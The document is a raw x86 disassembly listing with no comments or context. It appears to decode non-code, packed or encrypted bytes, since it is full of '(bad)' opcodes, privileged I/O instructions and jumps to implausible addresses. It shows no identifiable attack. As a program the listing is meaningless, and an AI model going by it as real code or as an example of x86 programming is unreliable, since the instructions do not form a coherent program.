  43bffc:	sbb    ch,BYTE PTR [edx+0x176f35cd]
  43c002:	jae    0x43bfdc
  43c004:	pop    ss
  43c005:	les    ebx,FWORD PTR [eax-0x28]
  43c008:	ss add al,0x10
  43c00b:	jge    0x43c009
  43c00d:	retf   
  43c00e:	enter  0xeba0,0x5d
  43c012:	fidivr DWORD PTR [edx]
  43c014:	and    BYTE PTR [ebp-0x40e943c6],bl
  43c01a:	sbb    DWORD PTR [eax+0x5f5bb6d6],eax
  43c020:	mov    esp,0xbb376a21
  43c025:	stos   BYTE PTR es:[edi],al
  43c026:	xchg   esi,eax
  43c027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c028:	mov    bl,0x88
  43c02a:	outs   dx,BYTE PTR ds:[esi]
  43c02b:	in     eax,0xc6
  43c02d:	add    ecx,edi
  43c02f:	sub    DWORD PTR [ecx-0x7259f935],ebp
  43c035:	lea    ebp,[ebp-0x3dc373fd]
  43c03b:	sub    DWORD PTR [esi+0x35],ecx
  43c03e:	in     eax,dx
  43c03f:	pop    ebx
  43c040:	push   ebx
  43c041:	add    BYTE PTR [edi+0x6eee9bce],dh
  43c047:	dec    esi
  43c048:	clc    
  43c049:	mov    bl,0xf6
  43c04b:	pop    ss
  43c04c:	(bad)  [esi]
  43c04e:	mov    BYTE PTR [edi-0x2a],dl
  43c051:	call   0x3cbc7fa3
  43c056:	xchg   esp,eax
  43c057:	or     ebp,DWORD PTR [ebp+ebp*8-0xd]
  43c05b:	addr16 aam 0xb
  43c05e:	loop   0x43c0c0
  43c060:	fstp   DWORD PTR [ebp-0x3e]
  43c063:	ja     0x43c040
  43c065:	pop    esp
  43c066:	repz ret 0xa4cc
  43c06a:	mov    al,0x1c
  43c06c:	add    dl,BYTE PTR [edx-0x6492548d]
  43c072:	call   0x9a09dc1b
  43c077:	aas    
  43c078:	lods   eax,DWORD PTR ds:[esi]
  43c079:	ds enter 0x6382,0x13
  43c07e:	add    BYTE PTR [eax-0x6a],dh
  43c081:	adc    BYTE PTR es:[ebp+0x2e84e14],al
  43c088:	fcmovb st,st(1)
  43c08a:	add    eax,0x90b602b2
  43c08f:	lods   eax,DWORD PTR ds:[esi]
  43c090:	jbe    0x43c0ed
  43c092:	push   ss
  43c093:	sbb    esp,DWORD PTR [ebp+0x77]
  43c096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c097:	dec    ebp
  43c098:	(bad)  
  43c099:	add    eax,0xf052b679
  43c09e:	rol    BYTE PTR [edx-0x1c],0x2d
  43c0a2:	inc    edx
  43c0a3:	lahf   
  43c0a4:	ret    0x67
  43c0a7:	fld    TBYTE PTR [ebp-0x25]
  43c0aa:	xlat   BYTE PTR ds:[ebx]
  43c0ab:	bound  ecx,QWORD PTR [esi]
  43c0ad:	pop    edi
  43c0ae:	mov    dh,0x7b
  43c0b0:	jmp    DWORD PTR [ebx]
  43c0b2:	imul   ah
  43c0b4:	mov    ds:0x437a575b,al
  43c0b9:	retf   
  43c0ba:	pop    esp
  43c0bb:	xchg   BYTE PTR [esi+0xe],dl
  43c0be:	mov    al,ds:0x55d1b14a
  43c0c3:	sbb    BYTE PTR [eax],ch
  43c0c5:	xor    BYTE PTR [ebx],bl
  43c0c7:	std    
  43c0c8:	int    0xf4
  43c0ca:	jo     0x43c0a7
  43c0cc:	lds    ebp,FWORD PTR [edi]
  43c0ce:	ret    0x9517
  43c0d1:	xchg   edi,eax
  43c0d2:	or     al,0xdd
  43c0d4:	mov    edi,0xaa8da2ed
  43c0d9:	and    al,0x27
  43c0db:	popf   
  43c0dc:	adc    DWORD PTR [eax],ecx
  43c0de:	mov    edi,0x15361d4d
  43c0e3:	mov    cl,0xc7
  43c0e5:	jb     0x43c15d
  43c0e7:	rol    cl,cl
  43c0e9:	push   edi
  43c0ea:	fnstsw WORD PTR [edx-0x2c3a276]
  43c0f0:	retf   
  43c0f1:	std    
  43c0f2:	dec    ebx
  43c0f3:	(bad)  
  43c0f4:	pop    ebp
  43c0f5:	add    DWORD PTR [esp+eax*2],ebp
  43c0f8:	loope  0x43c142
  43c0fa:	push   eax
  43c0fb:	or     esp,eax
  43c0fd:	sub    ah,al
  43c0ff:	mov    dh,0x6d
  43c101:	sbb    bl,dh
  43c103:	aam    0xe3
  43c105:	sbb    eax,0xdb78db
  43c10a:	pop    esp
  43c10b:	call   0xa2a85d03
  43c110:	cmp    BYTE PTR [esi-0x6540ed69],dl
  43c116:	or     BYTE PTR [esi+0x15b0306d],dl
  43c11c:	sbb    edi,DWORD PTR [ebx-0x58]
  43c11f:	xchg   ebp,eax
  43c120:	pop    edi
  43c121:	fdiv   DWORD PTR [esi]
  43c123:	cmp    al,0xab
  43c125:	mov    dh,0x81
  43c127:	jl     0x43c0c7
  43c129:	sbb    al,BYTE PTR [eax]
  43c12b:	mov    esi,0xba2aea1a
  43c130:	mov    ch,0xd7
  43c132:	xchg   edx,eax
  43c133:	mov    BYTE PTR [ebx+0x456e74ec],dl
  43c139:	fld    TBYTE PTR [ebp+0x5b]
  43c13c:	add    cl,BYTE PTR [edi-0x4a]
  43c13f:	outs   dx,DWORD PTR ds:[esi]
  43c140:	ret    0xe77f
  43c143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c144:	int    0xed
  43c146:	sbb    BYTE PTR [ebx+0x17],0xe3
  43c14a:	jnp    0x43c108
  43c14c:	popa   
  43c14d:	(bad)  
  43c14e:	rol    DWORD PTR [ebx+ecx*8+0x14],cl
  43c152:	push   ecx
  43c153:	inc    ebx
  43c154:	add    al,0x21
  43c156:	jno    0x43c17e
  43c158:	mov    bh,dl
  43c15a:	mov    ah,0x8b
  43c15c:	ror    BYTE PTR [esi],cl
  43c15e:	jno    0x43c103
  43c160:	jmp    0xa6c3c44d
  43c165:	add    eax,0x198b8f9b
  43c16a:	add    al,ch
  43c16c:	(bad)  
  43c16d:	add    BYTE PTR [eax+0x2],ah
  43c170:	cmp    eax,0xeb6d6aa
  43c175:	cmp    ah,BYTE PTR [eax+0xb8dd730]
  43c17b:	mov    ds:0x76b7d117,al
  43c180:	imul   eax,ebp,0x26
  43c183:	scas   al,BYTE PTR es:[edi]
  43c184:	mov    edi,0xa4e6a829
  43c189:	in     al,0x50
  43c18b:	mov    eax,ds:0xb8153600
  43c190:	ret    
  43c191:	jbe    0x43c13f
  43c193:	fdiv   DWORD PTR [esi-0x442e5573]
  43c199:	jl     0x43c166
  43c19b:	pop    edi
  43c19c:	mov    edi,0xfd150d65
  43c1a1:	fidiv  DWORD PTR [eax]
  43c1a3:	outs   dx,DWORD PTR ds:[esi]
  43c1a4:	xchg   esp,eax
  43c1a5:	out    dx,al
  43c1a6:	jbe    0x43c1fd
  43c1a8:	cli    
  43c1a9:	jns    0x43c165
  43c1ab:	push   esp
  43c1ac:	outs   dx,BYTE PTR ds:[esi]
  43c1ad:	mov    edi,0xcc027ed7
  43c1b2:	cs mov esp,0xc6c1e8a1
  43c1b8:	ins    DWORD PTR es:[edi],dx
  43c1b9:	cdq    
  43c1ba:	or     BYTE PTR [ecx-0x4cfec3ea],bl
  43c1c0:	shl    BYTE PTR [esi-0x588d68f1],1
  43c1c6:	or     eax,0xb00c9485
  43c1cb:	and    bh,BYTE PTR [edi-0x4755d140]
  43c1d1:	xchg   esp,eax
  43c1d2:	xchg   DWORD PTR [ebx+edi*4],edi
  43c1d5:	scas   eax,DWORD PTR es:[edi]
  43c1d6:	cmp    edi,DWORD PTR [edx]
  43c1d8:	test   al,0x6a
  43c1da:	inc    ebx
  43c1db:	iret   
  43c1dc:	jne    0x43c1cd
  43c1de:	int    0x66
  43c1e0:	inc    edx
  43c1e1:	add    eax,DWORD PTR [ecx+0x37]
  43c1e4:	sub    eax,0x46aed865
  43c1e9:	jo     0x43c19b
  43c1eb:	sub    DWORD PTR [eax+0x7a0255db],esp
  43c1f1:	(bad)  
  43c1f2:	jp     0x43c237
  43c1f4:	ret    
  43c1f5:	in     al,dx
  43c1f6:	sub    dh,BYTE PTR [esi]
  43c1f8:	inc    ecx
  43c1f9:	lea    ebp,[ebp-0x20]
  43c1fc:	stc    
  43c1fd:	inc    esi
  43c1fe:	imul   DWORD PTR [ebp+0x54]
  43c201:	dec    ebp
  43c202:	add    eax,0xb364462b
  43c207:	jmp    0x24b8:0xc2b1add3
  43c20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c20f:	cmp    dh,BYTE PTR [ebx-0x297fe5fb]
  43c215:	push   esp
  43c216:	push   ecx
  43c217:	cmp    esp,ecx
  43c219:	cmp    DWORD PTR [esp+ebx*8+0x1d2d1411],eax
  43c220:	xchg   esp,eax
  43c221:	in     eax,dx
  43c222:	or     eax,0xe0bab69f
  43c227:	mov    ah,BYTE PTR [esi+esi*4+0xba3712c]
  43c22e:	and    al,0xf5
  43c230:	pop    esi
  43c231:	pop    esi
  43c232:	jle    0x43c283
  43c234:	ret    0xb635
  43c237:	sbb    eax,0xf7ab5cc4
  43c23c:	jno    0x43c240
  43c23e:	dec    esp
  43c23f:	dec    ebx
  43c240:	test   eax,0xb0b88aed
  43c245:	aam    0x7e
  43c247:	mov    esp,0xb6b97fc7
  43c24c:	stos   BYTE PTR es:[edi],al
  43c24d:	loop   0x43c1e5
  43c24f:	imul   eax,eax,0x7c
  43c252:	xchg   ecx,eax
  43c253:	leave  
  43c254:	push   edi
  43c255:	or     bl,0x17
  43c258:	cmp    ch,BYTE PTR [ecx]
  43c25a:	xchg   DWORD PTR [edx-0x49],ebp
  43c25d:	xor    BYTE PTR [eax],al
  43c25f:	lahf   
  43c260:	mov    ecx,0xb6d89917
  43c265:	xchg   BYTE PTR ds:0xb0beb99a,ch
  43c26b:	xchg   ecx,eax
  43c26c:	jo     0x43c249
  43c26e:	call   0xa521:0x8c826ea3
  43c275:	pop    esi
  43c276:	add    eax,0xb6dbce2d
  43c27b:	and    DWORD PTR [edx+0xf],ebp
  43c27e:	fisubr WORD PTR [ecx-0x3d184337]
  43c284:	rol    DWORD PTR [ecx*8+0x9460410],1
  43c28b:	imul   edx,DWORD PTR [ebp-0x7b],0x16
  43c28f:	dec    edi
  43c290:	or     edi,DWORD PTR [ebp-0x63]
  43c293:	shr    DWORD PTR ds:0xd5075cb4,cl
  43c299:	jmp    0xbbcd002
  43c29e:	outs   dx,BYTE PTR ds:[esi]
  43c29f:	dec    ebx
  43c2a0:	jb     0x43c2ef
  43c2a2:	add    BYTE PTR [edi+0x61],ch
  43c2a5:	push   esp
  43c2a6:	sbb    edi,DWORD PTR [edi]
  43c2a8:	jae    0x43c290
  43c2aa:	mov    edx,0x6b0f60a5
  43c2af:	push   edi
  43c2b0:	or     eax,0x2d131f64
  43c2b5:	dec    ecx
  43c2b6:	xlat   BYTE PTR ds:[ebx]
  43c2b7:	pop    ebp
  43c2b8:	or     BYTE PTR [ebx],ah
  43c2ba:	push   0xf6437225
  43c2bf:	leavew 
  43c2c1:	mov    edx,0x1f690d46
  43c2c6:	and    DWORD PTR [bx+di],edx
  43c2c9:	jmp    0x43c285
  43c2cb:	stos   DWORD PTR es:[edi],eax
  43c2cc:	ins    BYTE PTR es:[edi],dx
  43c2cd:	add    BYTE PTR ds:0x632f6185,al
  43c2d3:	pop    ecx
  43c2d4:	sub    eax,0xb9b4ac4
  43c2d9:	inc    ecx
  43c2da:	mov    ds:0x8303074f,al
  43c2df:	lea    ebp,[ebp-0x12]
  43c2e2:	pop    ss
  43c2e3:	inc    ecx
  43c2e4:	lock dec edx
  43c2e6:	mov    bl,0x65
  43c2e8:	or     DWORD PTR [edx+edi*4-0x33],ebp
  43c2ec:	jne    0x43c351
  43c2ee:	jne    0x43c331
  43c2f0:	or     DWORD PTR [edi+0x3],esp
  43c2f3:	xchg   DWORD PTR [ecx+ebp*4+0x53],esi
  43c2f7:	jne    0x43c2c6
  43c2f9:	frstor [esi+0x37]
  43c2fc:	je     0x43c303
  43c2fe:	ins    DWORD PTR es:[edi],dx
  43c2ff:	add    BYTE PTR [edx+0x72],ah
  43c302:	int    0x4f
  43c304:	(bad)  
  43c305:	jne    0x43c2ba
  43c307:	int    0x51
  43c309:	adc    DWORD PTR [edi+0xf],ebp
  43c30c:	cdq    
  43c30d:	dec    esi
  43c30e:	or     esi,DWORD PTR [esi+0x21]
  43c311:	adc    BYTE PTR [eax+0x44115bae],dh
  43c317:	pop    es
  43c318:	arpl   WORD PTR [ecx],dx
  43c31a:	dec    esi
  43c31b:	mov    BYTE PTR [ebp-0x11],bh
  43c31e:	and    eax,0x76f7969
  43c323:	adc    DWORD PTR [ebx],eax
  43c325:	add    eax,0x9105efb
  43c32a:	paddw  mm0,QWORD PTR [ebx]
  43c32d:	repz fcomp QWORD PTR [eax+0x77]
  43c331:	xchg   ebp,eax
  43c332:	add    BYTE PTR [esi],cl
  43c334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c335:	bound  esp,QWORD PTR [ebx-0x1453348e]
  43c33b:	call   0x45:0x208fff
  43c342:	jb     0x43c3b3
  43c344:	add    edi,DWORD PTR [edi]
  43c346:	sbb    eax,0xe8458163
  43c34b:	mov    edx,0x2001736e
  43c350:	popf   
  43c351:	imul   edx,DWORD PTR [edi],0xf759416c
  43c357:	cmp    eax,0x136e09f7
  43c35c:	or     eax,DWORD PTR ds:0x29720164
  43c362:	mov    eax,ds:0x25375cfb
  43c367:	in     eax,dx
  43c368:	and    BYTE PTR [ebx],ah
  43c36a:	and    DWORD PTR [ebp+0x29],ebp
  43c36d:	fs pop ss
  43c36f:	idiv   DWORD PTR [edx+0xd651bae]
  43c375:	daa    
  43c376:	sbb    esi,DWORD PTR [ebx+0x5]
  43c379:	cs and eax,0xc216f22b
  43c37f:	mov    edx,0xe741661d
  43c384:	dec    edx
  43c385:	add    BYTE PTR [ecx-0x3e],ah
  43c388:	popa   
  43c389:	inc    edx
  43c38a:	aaa    
  43c38b:	inc    esi
  43c38c:	pop    ss
  43c38d:	bound  esi,QWORD PTR [ecx+0x7]
  43c390:	test   DWORD PTR [eax-0x7e9ed9b3],ebx
  43c396:	add    eax,DWORD PTR [edi]
  43c398:	js     0x43c340
  43c39a:	fwait
  43c39b:	jo     0x43c336
  43c39d:	jge    0x43c3d6
  43c39f:	push   ebx
  43c3a0:	inc    edi
  43c3a1:	push   es
  43c3a2:	popa   
  43c3a3:	adc    BYTE PTR [esi+0x6b],cl
  43c3a6:	add    esp,DWORD PTR [ebx+0x3]
  43c3a9:	pop    ecx
  43c3aa:	pop    es
  43c3ab:	into   
  43c3ac:	push   ds
  43c3ad:	mov    cl,0xc1
  43c3af:	pop    edi
  43c3b0:	jne    0x43c407
  43c3b2:	sbb    eax,0x1c0a7267
  43c3b7:	gs leave 
  43c3b9:	adc    DWORD PTR [eax],eax
  43c3bb:	pop    ds
  43c3bc:	cwde   
  43c3bd:	imul   eax,esi,0xffffffc6
  43c3c0:	(bad)  
  43c3c1:	sub    DWORD PTR [ecx+0x47],ebp
  43c3c4:	je     0x43c393
  43c3c6:	jb     0x43c43b
  43c3c8:	emms   
  43c3ca:	js     0x43c42b
  43c3cc:	lods   al,BYTE PTR ds:[esi]
  43c3cd:	out    dx,ax
  43c3cf:	sbb    eax,0xd90fa572
  43c3d4:	pop    ebp
  43c3d5:	ja     0x43c3bf
  43c3d7:	mov    edx,0x6b7b6f9f
  43c3dc:	mov    cl,0x3f
  43c3de:	dec    ecx
  43c3df:	aaa    
  43c3e0:	jbe    0x43c425
  43c3e2:	jbe    0x43c45c
  43c3e4:	je     0x43c405
  43c3e6:	ins    BYTE PTR es:[edi],dx
  43c3e7:	mov    ds:0x3c744f63,eax
  43c3ec:	and    cl,BYTE PTR [ebp+esi*2+0x63497039]
  43c3f3:	jno    0x43c416
  43c3f5:	fwait
  43c3f6:	retf   0x784e
  43c3f9:	fnstsw WORD PTR [edi+0x19]
  43c3fc:	aas    
  43c3fd:	outs   dx,DWORD PTR ds:[esi]
  43c3fe:	cmp    eax,0x18406c80
  43c403:	jb     0x43c3b8
  43c405:	and    eax,0xc8ccb633
  43c40a:	inc    edx
  43c40b:	mov    bh,0x28
  43c40d:	and    eax,0x5ae078a3
  43c412:	arpl   WORD PTR [edi+0xf0a001e],si
  43c418:	xor    eax,0xc86c1f6a
  43c41d:	mov    edx,0x6e4773ef
  43c422:	or     esi,DWORD PTR [ecx+ebp*4+0x74]
  43c426:	pop    edi
  43c427:	jno    0x43c3bf
  43c429:	mov    al,0x9
  43c42b:	data16 fstp DWORD PTR [ebx+0x29]
  43c42f:	ret    
  43c430:	add    al,0x76
  43c432:	call   0x11c5:0x3d1d1331
  43c439:	outs   dx,BYTE PTR ds:[esi]
  43c43a:	test   BYTE PTR [ebx],dh
  43c43c:	push   ebx
  43c43d:	inc    bx
  43c43f:	ja     0x43c45c
  43c441:	pop    edi
  43c442:	retf   0x6a46
  43c445:	mov    cl,0x8b
  43c447:	gs jne 0x43c493
  43c44a:	addr16 push esi
  43c44c:	ret    0x6014
  43c44f:	jnp    0x43c461
  43c451:	out    0x7a,eax
  43c453:	sub    DWORD PTR [ecx-0x38],esp
  43c456:	mov    edx,DWORD PTR [eax]
  43c458:	push   ebp
  43c459:	das    
  43c45a:	adc    al,0x8
  43c45c:	lahf   
  43c45d:	sti    
  43c45e:	add    DWORD PTR [ebp+0x27],ebp
  43c461:	xor    edx,DWORD PTR [ebx+ebp*8]
  43c464:	xchg   DWORD PTR [eax-0x16e823ee],esi
  43c46a:	sbb    DWORD PTR [ebp+0x73],0x75d623c4
  43c471:	push   ebx
  43c472:	jo     0x43c475
  43c474:	outs   dx,DWORD PTR ds:[esi]
  43c475:	out    0x45,eax
  43c477:	in     al,dx
  43c478:	lea    ecx,[ebp+0x7f55b2b5]
  43c47e:	js     0x43c4b5
  43c480:	arpl   WORD PTR ds:0xa49a6b5f,dx
  43c486:	or     DWORD PTR [ebp-0x27],esp
  43c489:	adc    eax,0x462778e5
  43c48e:	cli    
  43c48f:	sahf   
  43c490:	sbb    esi,DWORD PTR [edx+0x1b]
  43c493:	xchg   ecx,eax
  43c494:	sbb    eax,0x8b70eb78
  43c499:	aam    0x75
  43c49b:	retf   
  43c49c:	jae    0x43c49b
  43c49e:	js     0x43c479
  43c4a0:	inc    ecx
  43c4a1:	xchg   ebx,eax
  43c4a2:	sub    edi,DWORD PTR [ebp+0x7]
  43c4a5:	ja     0x43c480
  43c4a7:	sbb    DWORD PTR [esi+0x35],esp
  43c4aa:	jns    0x43c515
  43c4ac:	pop    ss
  43c4ad:	inc    esp
  43c4ae:	neg    dh
  43c4b0:	in     al,dx
  43c4b1:	(bad)  [ebp+0x17]
  43c4b4:	inc    ebp
  43c4b5:	scas   eax,DWORD PTR es:[edi]
  43c4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c4b7:	inc    ebx
  43c4b8:	retf   0x1cde
  43c4bb:	jge    0x43c528
  43c4bd:	jg     0x43c4f8
  43c4bf:	aad    0x1d
  43c4c1:	fidivr WORD PTR [ebx+0x3f979563]
  43c4c7:	and    eax,0x3849a768
  43c4cc:	mov    WORD PTR [ebp+0x10],es
  43c4cf:	(bad)  
  43c4d0:	xchg   edi,eax
  43c4d1:	sub    al,0x4d
  43c4d3:	retf   0xc34c
  43c4d6:	jnp    0x43c50f
  43c4d8:	outs   dx,DWORD PTR ds:[esi]
  43c4d9:	test   eax,0xbec90064
  43c4de:	xchg   ebp,eax
  43c4df:	mov    ah,0x33
  43c4e1:	fwait
  43c4e2:	imul   eax,ecx,0x18076530
  43c4e8:	call   DWORD PTR [esi]
  43c4ea:	xor    esp,DWORD PTR [ebx-0x44]
  43c4ed:	and    eax,0x1707221c
  43c4f2:	mov    bh,0xb3
  43c4f4:	and    BYTE PTR [ecx+0x2],dl
  43c4f7:	cmovnp esi,DWORD PTR [eax]
  43c4fa:	aaa    
  43c4fb:	sahf   
  43c4fc:	retf   0x400e
  43c4ff:	sbb    DWORD PTR [eax],edx
  43c501:	popa   
  43c502:	push   cs
  43c503:	add    BYTE PTR [ebx+0x34],dl
  43c506:	xor    cl,0x60
  43c509:	mov    ebp,DWORD PTR [ebx-0x53]
  43c50c:	or     eax,0x8bec6ea4
  43c511:	mov    bh,0xf1
  43c513:	jb     0x43c54c
  43c515:	sub    eax,0x1e4b200f
  43c51a:	pop    esi
  43c51b:	mov    WORD PTR [esi+0x74],gs
  43c51e:	jmp    0x43c570
  43c520:	xor    eax,0x3967df53
  43c525:	add    DWORD PTR [ebx+0x30],0x4d
  43c529:	and    DWORD PTR [ecx],ebp
  43c52b:	jne    0x43c55c
  43c52d:	xor    DWORD PTR [eax-0x68],0xbfcb2867
  43c534:	data16 mov bl,0x5
  43c537:	add    bh,bh
  43c539:	sbb    ebp,edi
  43c53b:	sti    
  43c53c:	pop    esi
  43c53d:	mov    al,0xce
  43c53f:	in     eax,dx
  43c540:	or     eax,0x110b034b
  43c545:	fcmovnb st,st(1)
  43c547:	mov    dl,0x87
  43c549:	xchg   DWORD PTR [edi],ebp
  43c54b:	imul   esp,DWORD PTR [ebx-0x2f],0x84c0cfbc
  43c552:	cdq    
  43c553:	xor    DWORD PTR [ecx+0xb1f6d07],ebp
  43c559:	or     DWORD PTR [edi+0x19],ebp
  43c55c:	push   ebp
  43c55d:	jae    0x43c506
  43c55f:	and    eax,0xd9afb99d
  43c564:	adc    eax,0x51576d1f
  43c569:	bound  eax,QWORD PTR [ebx]
  43c56b:	dec    eax
  43c56c:	arpl   WORD PTR [ebx+0x68f3778f],ax
  43c572:	scas   eax,DWORD PTR es:[edi]
  43c573:	sbb    edi,DWORD PTR [ebx-0x54]
  43c576:	sub    al,0x6
  43c578:	sub    eax,0x2955fb17
  43c57d:	imul   eax,DWORD PTR [edx],0x3b
  43c580:	and    WORD PTR [edx],0x2b
  43c584:	shl    BYTE PTR [esp+ebx*1+0x18],cl
  43c588:	shl    DWORD PTR [eax],0xd9
  43c58b:	jae    0x43c5b0
  43c58d:	jo     0x43c51c
  43c58f:	mov    BYTE PTR [eax+edx*4+0x7],al
  43c593:	test   bh,ch
  43c595:	cdq    
  43c596:	js     0x43c593
  43c598:	add    eax,0x24174ddd
  43c59d:	add    ebp,DWORD PTR [ebx]
  43c59f:	sub    esi,esi
  43c5a1:	add    eax,0xed237249
  43c5a6:	test   ecx,eax
  43c5a8:	push   ebp
  43c5a9:	push   es
  43c5aa:	lea    ebp,[ecx]
  43c5ac:	mov    ecx,0xa1d7be0
  43c5b1:	test   DWORD PTR [ecx],esp
  43c5b3:	daa    
  43c5b4:	jne    0x43c54f
  43c5b6:	jnp    0x43c627
  43c5b8:	inc    eax
  43c5b9:	dec    ecx
  43c5ba:	bound  ecx,QWORD PTR [edi]
  43c5bc:	sbb    eax,0x95840039
  43c5c1:	or     dl,BYTE PTR [esi-0xe]
  43c5c4:	cmp    eax,0x871e27a6
  43c5c9:	sbb    DWORD PTR [edi],ebx
  43c5cb:	imul   ecx,DWORD PTR [ebx+eiz*2],0x31
  43c5cf:	imul   esp,DWORD PTR [eax-0x47],0xd5a71f2f
  43c5d6:	mov    dl,0x9
  43c5d8:	jmp    0x43c58b
  43c5da:	retf   
  43c5db:	inc    esi
  43c5dc:	mov    edx,DWORD PTR [ebp+0x66]
  43c5df:	ja     0x43c60c
  43c5e1:	fcom   DWORD PTR [ebp+0x2d667940]
  43c5e7:	(bad)  
  43c5e9:	adc    eax,0x6e61de00
  43c5ee:	outs   dx,DWORD PTR ds:[esi]
  43c5ef:	outs   dx,DWORD PTR ds:[esi]
  43c5f0:	sub    eax,0xed2fa49b
  43c5f5:	jns    0x43c5da
  43c5f7:	outs   dx,BYTE PTR ds:[esi]
  43c5f8:	sub    eax,0xd603484b
  43c5fd:	mov    edi,0x5f616712
  43c602:	sti    
  43c603:	mov    esi,0x6eee0f24
  43c608:	sbb    ebx,DWORD PTR [ecx+0x6f65fd17]
  43c60e:	mul    BYTE PTR [esi-0x1c]
  43c611:	dec    ebp
  43c612:	mov    ds:0x7bdb07b7,eax
  43c617:	ret    0x65c5
  43c61a:	push   edi
  43c61b:	or     DWORD PTR [ebp-0x7],ebp
  43c61e:	imul   edx,DWORD PTR [ebx],0x63
  43c621:	retf   0x1846
  43c624:	jne    0x43c621
  43c626:	adc    eax,0xc2616eb3
  43c62b:	and    BYTE PTR [esp+eax*1],bh
  43c62e:	xchg   ecx,eax
  43c62f:	arpl   WORD PTR [ecx+0x70],si
  43c632:	sub    ecx,DWORD PTR [ebx+0x12]
  43c635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c636:	aaa    
  43c637:	adc    BYTE PTR [edi],bh
  43c639:	(bad)  
  43c63a:	cmc    
  43c63b:	ja     0x43c651
  43c63d:	mov    ecx,0x7ac3df7b
  43c642:	das    
  43c643:	xlat   BYTE PTR ds:[ebx]
  43c644:	adc    DWORD PTR [eax],eax
  43c646:	push   edx
  43c647:	inc    edx
  43c648:	sbb    bl,ch
  43c64a:	jecxz  0x43c5f5
  43c64c:	adc    eax,0x496b8b68
  43c651:	xchg   ecx,eax
  43c652:	lods   al,BYTE PTR ds:[esi]
  43c653:	dec    ecx
  43c654:	pusha  
  43c655:	adc    BYTE PTR [ebx+0x2b78e567],ah
  43c65b:	popa   
  43c65c:	and    al,0x4d
  43c65e:	inc    edi
  43c65f:	sbb    DWORD PTR [eax+0x5fc0c098],esi
  43c665:	sub    DWORD PTR ds:0x8e199076,esp
  43c66b:	pop    ds
  43c66c:	aas    
  43c66d:	xor    DWORD PTR [edi+eax*8-0x38],esp
  43c671:	inc    edx
  43c672:	fst    DWORD PTR [eax+0x17]
  43c675:	aas    
  43c676:	mov    cl,0xb0
  43c678:	sbb    DWORD PTR [ecx+0x1f2f18ec],esp
  43c67e:	xor    edi,edi
  43c680:	call   DWORD PTR [ecx+0x36]
  43c683:	add    BYTE PTR [edx+0x7b98df8c],ah
  43c689:	cmp    al,0x3a
  43c68b:	jns    0x43c6b3
  43c68d:	jno    0x43c6ce
  43c68f:	or     DWORD PTR [edi],ecx
  43c691:	sub    ah,BYTE PTR ds:0xba7bbf1b
  43c697:	pop    ss
  43c698:	pop    ss
  43c699:	int3   
  43c69a:	or     al,BYTE PTR [ebx]
  43c69c:	add    DWORD PTR [edx+0x62455454],edi
  43c6a2:	dec    ecx
  43c6a3:	adc    BYTE PTR [ebp+0x24f44117],cl
  43c6a9:	push   esi
  43c6aa:	popa   
  43c6ab:	jb     0x43c6dc
  43c6ad:	mov    dl,0xa2
  43c6af:	mov    al,ds:0x574bfe3a
  43c6b4:	imul   ebp,DWORD PTR [esi+0x64],0xc7fa776f
  43c6bb:	mov    al,BYTE PTR [esi-0x7e153e45]
  43c6c1:	or     BYTE PTR [ecx+0x6e],cl
  43c6c4:	imul   esi,DWORD PTR [edi-0x662cccab],0x21a92a0
  43c6ce:	das    
  43c6cf:	(bad)  
  43c6d1:	fcmovu st,st(5)
  43c6d3:	adc    BYTE PTR [ebp+0x6e6f430a],bl
  43c6d9:	sub    DWORD PTR ds:0x1c4d7883,edx
  43c6df:	jae    0x43c742
  43c6e1:	addr16 add al,0x9
  43c6e4:	mov    ds:0x3d4321f8,al
  43c6e9:	inc    esp
  43c6ea:	nop
  43c6eb:	adc    DWORD PTR [ecx],edx
  43c6ed:	mov    al,cl
  43c6ef:	jb     0x43c6f8
  43c6f1:	inc    ebx
  43c6f2:	in     al,dx
  43c6f3:	ret    
  43c6f4:	aam    0x1
  43c6f6:	add    DWORD PTR [edi-0x21],edx
  43c6f9:	fsub   DWORD PTR ss:[eax-0x74b95a99]
  43c700:	or     dl,BYTE PTR gs:[esi+0x69]
  43c704:	jb     0x43c77a
  43c706:	fucomi st,st(6)
  43c708:	outs   dx,DWORD PTR ds:[esi]
  43c709:	push   DWORD PTR [ebp+0x61]
  43c70c:	ins    BYTE PTR es:[edi],dx
  43c70d:	push   ecx
  43c70e:	jne    0x43c775
  43c710:	jb     0x43c78b
  43c712:	or     eax,0x7661654c
  43c717:	gs inc ebx
  43c719:	sbb    eax,0x53136369
  43c71e:	ror    BYTE PTR [eax+edx*1-0x2f],1
  43c722:	arpl   WORD PTR gs:[esi+0x15],dx
  43c726:	imul   BYTE PTR [ebx]
  43c728:	mov    ebx,0xf69c87d
  43c72d:	imul   edi,DWORD PTR [edx+0x1a],0x56746547
  43c734:	cmp    edi,esp
  43c736:	and    BYTE PTR [eax+0x600b73dc],al
  43c73c:	push   cs
  43c73d:	or     BYTE PTR [ecx-0x2f],al
  43c740:	not    BYTE PTR [eax+ebp*2+0x72]
  43c744:	inc    esp
  43c745:	fs out 0x62,al
  43c748:	push   eax
  43c749:	adc    al,0xb1
  43c74b:	adc    BYTE PTR [ebp+0x2766fc1b],al
  43c751:	add    eax,0x48641122
  43c756:	out    0x64,eax
  43c758:	xor    esi,ecx
  43c75a:	in     eax,dx
  43c75b:	pusha  
  43c75c:	pop    ds
  43c75d:	push   eax
  43c75e:	jb     0x43c78b
  43c760:	inc    ecx
  43c761:	fs fs jb 0x43c76c
  43c765:	invlpg BYTE PTR [ebx]
  43c768:	imul   ebx,DWORD PTR [edi],0x4d
  43c76b:	outs   dx,DWORD PTR ds:[esi]
  43c76c:	fs jne 0x43c789
  43c76f:	and    BYTE PTR [ecx+0x11],al
  43c772:	pop    ss
  43c773:	sub    ebp,DWORD PTR [eax]
  43c775:	jp     0x43c726
  43c777:	mov    esi,0x6ec07b13
  43c77c:	mov    bl,0x60
  43c77e:	cdq    
  43c77f:	outs   dx,WORD PTR ds:[esi]
  43c781:	andps  xmm5,XMMWORD PTR [ecx+0x6d]
  43c785:	push   ebx
  43c786:	jp     0x43c763
  43c788:	out    dx,al
  43c789:	aaa    
